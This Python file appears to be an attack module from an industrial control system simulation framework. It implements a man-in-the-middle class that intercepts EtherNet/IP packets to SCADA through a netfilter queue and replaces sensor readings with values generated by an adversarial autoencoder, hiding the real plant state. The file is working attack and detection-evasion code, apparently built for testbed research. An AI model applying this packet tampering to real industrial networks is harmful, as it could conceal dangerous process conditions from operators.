from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path

import os
import sys

import pandas as pd

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload
from evasion_attacks.Adversarial_Attacks.Black_Box_Attack.adversarial_AE import Adversarial_AE

from tensorflow.keras.callbacks import EarlyStopping, ModelCheckpoint
from tensorflow.keras.layers import *
from tensorflow.keras.models import *
from tensorflow.keras import optimizers
from tensorflow.keras.callbacks import *
from tensorflow import keras

# sklearn
from sklearn.model_selection import train_test_split
from sklearn.metrics import mean_squared_error
from sklearn.metrics import accuracy_score, f1_score, roc_curve, auc, precision_score, confusion_matrix, recall_score
from sklearn.preprocessing import MinMaxScaler

from concealment_ae_model import ConcealmentAE

import threading
import signal

import glob

class Error(Exception):
    """Base class for exceptions in this module."""


class ConcealmentError(Error):
    """Raised when there is an error in the concealment parameter"""


class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):

    """ Time in seconds to check attack sync flags"""
    FLAG_SYNC_UPDATE_TIME = 0.1

    def __init__(self,  intermediate_yaml_path: Path, yaml_index: int, queue_number: int ):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)

        # toDo: This will be updated depending on the ae model
        self.window_size = 6
        self.complete_scada_set = False
        self.received_window_size = 0

        # set with all the tags received by SCADA
        self.scada_tags = self.get_scada_tags()

        # We can use the same method, as initially the df will be initialized with 0 values
        self.calculated_concealment_values_df = self.set_initial_conditions_of_scada_values()

        # Initialize input values
        self.received_scada_tags_df = self.calculated_concealment_values_df

        # set with the tags we have not received in this iteration
        self.missing_scada_tags = list(self.scada_tags)


        self.scada_values = []
        self.scada_session_ids = []
        self.initialized = False

        # This flaf ensures that the prediction is called only once per iteration
        self.predicted_for_iteration = False

        #toDo: This will be something configured in the YAML file
        file_expr = 'training_data/ctown/'

        # Adversarial model for concealment
        self.advAE = ConcealmentAE(file_expr)

        try:
            self.advAE.generator = load_model('adversarial_models/generator_100_percent.h5')
            self.logger.debug('Trained model found')

        except FileNotFoundError:
            self.logger.info('No trained model found, training...')
            self.advAE.train_model()
            self.logger.info('Model trained')
            self.advAE.save_model('adversarial_models/generator_100_percent.h5')
            self.logger.info('Model saved')
            self.advAE.generator = load_model('adversarial_models/generator_100_percent.h5')

        except IOError:
            self.logger.info('No trained model found, training...')
            self.advAE.train_model()
            self.logger.info('Model trained')
            self.advAE.save_model('adversarial_models/generator_100_percent.h5')
            self.logger.info('Model saved')
            self.advAE.generator = load_model('adversarial_models/generator_100_percent.h5')
        self.sync_thread_flag = True
        self.sync_thread = threading.Thread(target=self.handle_sync)
        self.sync_thread.start()

    def interrupt(self):
        self.sync_thread_flag = False

    def sigint_handler(self, sig, frame):
        """Interrupt handler for attacker being stoped"""
        self.logger.debug("Netfilter queue process shutting down")
        self.interrupt()

    def handle_sync(self):
        while self.sync_thread_flag:
            # flag = 0 means a physical process finished a new iteration
            while not self.get_sync(0):
                if self.sync_thread_flag:
                    pass
                else:
                    break

            # We have to keep the same state machine as PLCs
            self.set_sync(1)

            while not self.get_sync(2):
                if self.sync_thread_flag:
                    pass
                else:
                    break

            # We stay in 2, to conceal the values exchanged remotely from the PLCs, until we make a prediction
            while self.missing_scada_tags:
                if self.sync_thread_flag:
                    pass
                else:
                    break

            self.set_sync(3)


    def set_initial_conditions_of_scada_values(self):
        zero_values = [[0] * len(self.scada_tags)] * self.window_size
        df = pd.DataFrame(columns=self.scada_tags, data=zero_values)
        return df

    def get_scada_tags(self):
        aux_scada_tags = []
        for PLC in self.intermediate_yaml['plcs']:
            if 'sensors' in PLC:
                aux_scada_tags.extend(PLC['sensors'])
            if 'actuators' in PLC:
                aux_scada_tags.extend(PLC['actuators'])

        self.logger.debug('SCADA tags: ' + str(set(aux_scada_tags)))
        return set(aux_scada_tags)

    # Delivers a pandas dataframe with ALL SCADA tags
    def predict_concealment_values(self):

        self.calculated_concealment_values_df = self.advAE.predict(self.received_scada_tags_df)

        #received_window_size
        #zero_values = [[42] * len(self.scada_tags)] * self.window_size
        #self.calculated_concealment_values_df = pd.DataFrame(columns=self.scada_tags, data=zero_values)

        self.logger.debug('predicting')

    def handle_concealment(self, session, ip_payload):

        self.logger.debug('Concealing method for session: ' + str(session))

        if len(self.missing_scada_tags) == len(self.scada_tags):
            # We miss all the tags. Start of a new prediction cycle
            self.logger.debug('We miss all the tags. Start of a new prediction cycle')
            self.predicted_for_iteration = False

        #aux_tags = list(self.scada_tags)
        self.logger.debug('Missing tags are: ' + str(self.missing_scada_tags))
        #self.logger.debug('SCADA tags are: ' + str(self.scada_tags))
        self.logger.debug('Missing tags len: ' + str(len(self.missing_scada_tags)))
        #self.logger.debug('SCADA tags len: ' + str(len(self.scada_tags)))

        if session['tag'] in self.missing_scada_tags:
            # We store the value, this df is an input for the concealment ML model
            self.received_scada_tags_df[session['tag']].iloc[self.received_window_size] = translate_payload_to_float(ip_payload[Raw].load)
            self.logger.debug('Received tag ' + str(session['tag']) + ' with value: ' +
                              str(self.received_scada_tags_df[session['tag']].iloc[-1]))
            self.missing_scada_tags.remove(session['tag'])
            self.logger.debug('Missing tags len after removing: ' + str(len(self.missing_scada_tags)))

            # Missing set is empty, increase the window count
            if not self.missing_scada_tags:

                # Wait for sync to take place
                while not self.get_sync(3):
                    pass

                self.missing_scada_tags = list(self.scada_tags)

                if not self.initialized:
                    self.received_window_size = self.received_window_size + 1
                    if self.received_window_size >= self.window_size - 1:
                        self.initialized = True

                elif not self.predicted_for_iteration:
                    self.predict_concealment_values()
                    self.predicted_for_iteration = True

        # If model is initialized, we have to conceal, regardless of missing set
        if self.initialized:
            modified = True
            return translate_float_to_payload(self.calculated_concealment_values_df[session['tag']].iloc[-1],
                                                  ip_payload[Raw].load), modified
        else:
            modified = False
            # We don't conceal before initialization
            return ip_payload[Raw].load, modified

    def handle_enip_response(self, ip_payload):
        this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
        this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)

        #self.logger.debug('ENIP response session: ' + str(this_session))
        #self.logger.debug('ENIP response context: ' + str(this_context))

        #self.logger.debug('ENIP Response for: ' + str(ip_payload[IP].dst))

        try:
            # Concealment values to SCADA
            for session in self.scada_session_ids:
                if session['session'] == this_session and session['context'] == this_context:
                    self.logger.debug('Concealing to SCADA: ' + str(this_session))
                    return self.handle_concealment(session, ip_payload)

        except Exception as exc:
            self.logger.debug(exc)

        modified = False
        return ip_payload, modified

    def handle_enip_request(self, ip_payload):

        # For this concealment, the only valid target is SCADA
        #self.logger.debug('ENIP Request from: ' + str(ip_payload[IP].src))
        this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
        self.logger.debug('Raw text is: ' + str(ip_payload[Raw].load.decode(encoding='latin-1')[54:60]))
        tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:60].split(':')[0]
        context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)

        self.logger.debug('ENIP request for tag: ' + str(tag_name))
        session_dict = {'session': this_session, 'tag': tag_name, 'context': context}
        #self.logger.debug('session dict: ' + str(session_dict))

        #self.logger.debug('SCADA Req session')
        self.scada_session_ids.append(session_dict)

    def capture(self, packet):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 102, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        :param packet: The captured packet.
        """

        try:
            p = IP(packet.get_payload())
            if 'TCP' in p:
                if len(p) == 102:
                    p[Raw].load, modified = self.handle_enip_response(p)
                    if modified:
                        del p[IP].chksum
                        del p[TCP].chksum
                        packet.set_payload(bytes(p))
                    packet.accept()
                    return

                else:
                    if len(p) == 118 or len(p) == 116 or len(p) == 120:
                        self.handle_enip_request(p)
                    else:
                        packet.accept()
                        return

            packet.accept()

        except Exception as exc:
            print(exc)
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)


    def get_sync(self, flag):
        """
        Get the sync flag of this plc.
        On a :code:`sqlite3.OperationalError` it will retry with a max of :code:`DB_TRIES` tries.
        Before it reties, it will sleep for :code:`DB_SLEEP_TIME` seconds.

        :return: False if physical process wants the plc to do a iteration, True if not.

        :raise DatabaseError: When a :code:`sqlite3.OperationalError` is still raised after
           :code:`DB_TRIES` tries.
        """
        res = self.db_query("SELECT flag FROM sync WHERE name IS ?", False, (self.intermediate_attack["name"],))
        return res == flag

    def set_sync(self, flag):
        """
        Set this plcs sync flag in the sync table. When this is 1, the physical process
        knows this plc finished the requested iteration.
        On a :code:`sqlite3.OperationalError` it will retry with a max of :code:`DB_TRIES` tries.
        Before it reties, it will sleep for :code:`DB_SLEEP_TIME` seconds.

        :param flag: True for sync to 1, False for sync to 0
        :type flag: bool

        :raise DatabaseError: When a :code:`sqlite3.OperationalError` is still raised after
           :code:`DB_TRIES` tries.
        """
        self.db_query("UPDATE sync SET flag=? WHERE name IS ?", True, (int(flag), self.intermediate_attack["name"],))

    def set_attack_flag(self, flag):
        """
        Set a flag in the attack table. When it is 1, we know that the attack with the
        provided name is currently running. When it is 0, it is not.

        :param flag: True for running to 1, false for running to 0
        """
        self.db_query("UPDATE attack SET flag=? WHERE name IS ?", True, (int(flag), self.intermediate_attack['name']))

def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")
    parser.add_argument(dest="number", help="Number of que queue configured in IP Tables",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = UnconstrainedBlackBoxMiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number = args.number)
    attack.main_loop()

